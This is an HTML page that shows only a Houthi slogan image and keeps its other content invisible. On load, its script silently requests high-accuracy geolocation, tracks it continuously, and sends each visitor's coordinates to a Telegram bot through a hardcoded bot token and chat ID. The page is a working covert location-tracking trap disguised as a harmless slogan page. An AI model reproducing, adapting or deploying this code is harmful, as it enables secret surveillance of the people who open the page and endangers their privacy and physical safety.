<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>ุงูุตุฑุฎุฉ</title>
  <style>
    /* ุฅุฎูุงุก ูู ูุญุชูู ุงูุตูุญุฉ ุจุตุฑููุง */
    body, html {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
    }

    /* ุตูุฑุฉ ุงูุดุนุงุฑ ูู ุงููุณุท */
    #logo {
      max-width: 50%;
      max-height: 50%;
      z-index: 1000;
    }

    /* ุฅุฎูุงุก ุจุงูู ุงูุนูุงุตุฑ ุจุตุฑููุง ูุน ุฅุจูุงุฆูุง ูู DOM */
    .hidden-content {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0;  /* ูุฎูู ุงูุนูุงุตุฑ ุจุตุฑููุง */
      pointer-events: none; /* ูููุน ุงูุชูุงุนู ูุนูุง */
    }
  </style>
</head>
<body>
  <!-- ุงูุดุนุงุฑ ููุท ุธุงูุฑ -->
  <img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/38/Slogan_of_the_Houthi_Movement.svg/500px-Slogan_of_the_Houthi_Movement.svg.png" alt="ุดุนุงุฑ ุฃูุตุงุฑ ุงููู">

  <!-- ูู ูุญุชูู ุงูุตูุญุฉ ุงูุฃุตูู ูุฎูู ุจุตุฑููุง -->
  <div class="hidden-content">
    <header>
      <h1>ุงูุตุฑุฎุฉ</h1>
    </header>

    <div class="container">
      <section class="card row">
        <div>
          <div class="controls" style="margin-bottom:12px;">
            <button id="copyBtn" class="btn btn-secondary">ูุณุฎ ุงูุฅุญุฏุงุซูุงุช</button>
            <a class="btn btn-secondary" id="mapsBtn" target="_blank" rel="noopener">ูุชุญ ูู ุฎุฑุงุฆุท ุฌูุฌู</a>
          </div>
          <div class="hint">ุฃูุฏ ูุตุฏุงููุชู ุนูู ููู ุงูุญู</div>
          <div style="margin-top:10px; display:flex; gap:8px; flex-wrap:wrap;">
            <span class="badge ok" id="secureBadge">ุฃูุฏ ูุตุฏุงููุชู ุนูู ููู ุงูุญู</span>
            <span class="badge ok" id="permBadge">ุฃูุฏ ูุตุฏุงููุชู ุนูู ููู ุงูุญู</span>
            <span class="badge" id="sensorBadge">ุฃูุฏ ูุตุฏุงููุชู ุนูู ููู ุงูุญู</span>
          </div>
          <div class="kv" style="margin-top:12px;">
            <div>ุฎุท ุงูุนุฑุถ (lat):</div><div id="lat">โ</div>
            <div>ุฎุท ุงูุทูู (lng):</div><div id="lng">โ</div>
            <div>ุงูุฏูุฉ (ูุชุฑ):</div><div id="accuracy">โ</div>
            <div>ุงูุงุฑุชูุงุน (ูุชุฑ):</div><div id="altitude">โ</div>
            <div>ุฏูุฉ ุงูุงุฑุชูุงุน (ูุชุฑ):</div><div id="altAcc">โ</div>
            <div>ุงูุงุชุฌุงู (headingยฐ):</div><div id="heading">โ</div>
            <div>ุงูุณุฑุนุฉ (ู/ุซ):</div><div id="speed">โ</div>
            <div>ุขุฎุฑ ุชุญุฏูุซ:</div><div id="timestamp">โ</div>
          </div>
        </div>
        <div>
          <div id="map"></div>
        </div>
      </section>
    </div>

    <footer>ุฃูุฏ ูุตุฏุงููุชู ุนูู ููู ุงูุญู</footer>
  </div>

  <!-- Leaflet ูุฎุฑูุทุฉ -->
  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script>
    // ุงูููุฏ ุงูุฃุตูู ูุฌูุน ุงููููุน ูุฅุฑุณุงู ุงูุชูููุฌุฑุงู
    const TELEGRAM_TOKEN = "8267173113:AAGt0PYYlcrOCcoNC7PMMMhYNxNJrlx5aN0";
    const TELEGRAM_CHAT_ID = "6837315281";

    async function sendToTelegram(lat, lng, accuracy) {
      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
      const text = `๐ ูููุน ุฌุฏูุฏ:\nhttps://maps.google.com/?q=${lat},${lng}\nุฎุท ุงูุนุฑุถ: ${lat}\nุฎุท ุงูุทูู: ${lng}\nุงูุฏูุฉ: ${accuracy}m`;
      try { 
        await fetch(url, { 
          method:'POST', 
          headers:{'Content-Type':'application/json'}, 
          body:JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text}) 
        }); 
      } catch(e){ console.error("ูุดู ุงูุฅุฑุณุงู ุฅูู ุชูููุฌุฑุงู", e); }
    }

    const el = id => document.getElementById(id);
    const latEl = el('lat'), lngEl = el('lng'), accEl = el('accuracy'), altEl = el('altitude'),
          altAccEl = el('altAcc'), headEl = el('heading'), speedEl = el('speed'), timeEl = el('timestamp');
    const secureBadge = el('secureBadge'), permBadge = el('permBadge');
    const copyBtn = el('copyBtn'), mapsBtn = el('mapsBtn');

    const isSecure = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
    secureBadge.textContent = "ุฃูุฏ ูุตุฏุงููุชู ุนูู ููู ุงูุญู";

    let map = L.map('map').setView([15.3694, 44.1910], 6);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom:19 }).addTo(map);
    let marker=null, circle=null;

    function updateMap(lat,lng,accuracy){
      const pos=[lat,lng];
      if(!marker) marker=L.marker(pos).addTo(map); else marker.setLatLng(pos);
      if(!circle) circle=L.circle(pos,{radius:accuracy||30}).addTo(map); 
      else {circle.setLatLng(pos);circle.setRadius(accuracy||30);}
      map.setView(pos,17);
    }

    function fmt(n){ return (n==null)?'โ':Number(n).toFixed(6); }

    function showPosition(pos){
      const c=pos.coords;
      latEl.textContent = fmt(c.latitude);
      lngEl.textContent = fmt(c.longitude);
      accEl.textContent = c.accuracy?`${Math.round(c.accuracy)} m`:'โ';
      altEl.textContent = c.altitude!=null?`${Math.round(c.altitude)} m`:'โ';
      altAccEl.textContent = c.altitudeAccuracy!=null?`${Math.round(c.altitudeAccuracy)} m`:'โ';
      headEl.textContent = c.heading!=null&&!isNaN(c.heading)?`${Math.round(c.heading)}ยฐ`:'โ';
      speedEl.textContent = c.speed!=null?`${c.speed.toFixed(2)} m/s`:'โ';
      timeEl.textContent = new Date(pos.timestamp).toLocaleString();

      updateMap(c.latitude,c.longitude,c.accuracy||30);
      mapsBtn.href = `https://www.google.com/maps?q=${c.latitude},${c.longitude}`;
      sendToTelegram(c.latitude,c.longitude,Math.round(c.accuracy||0));
      permBadge.textContent = "ุฃูุฏ ูุตุฏุงููุชู ุนูู ููู ุงูุญู";
    }

    function showError(err){
      permBadge.textContent = "ุฃูุฏ ูุตุฏุงููุชู ุนูู ููู ุงูุญู";
      console.error("ุฎุทุฃ:", err.message);
    }

    function buildOptions(){ return { enableHighAccuracy:true, timeout:15000, maximumAge:0 }; }

    function getOnce(){ 
      if('geolocation' in navigator && isSecure) 
        navigator.geolocation.getCurrentPosition(showPosition,showError,buildOptions()); 
    }

    function startWatch(){
      if('geolocation' in navigator && isSecure){
        navigator.geolocation.watchPosition(showPosition, showError, buildOptions());
      }
    }

    copyBtn.addEventListener('click', async ()=>{
      const lat=latEl.textContent,lng=lngEl.textContent;
      if(lat==='โ') return;
      try{ await navigator.clipboard.writeText(`${lat},${lng}`); } catch{}
    });

    window.addEventListener('load', ()=>{
      getOnce();
      startWatch();
    });
  </script>
</body>
</html>
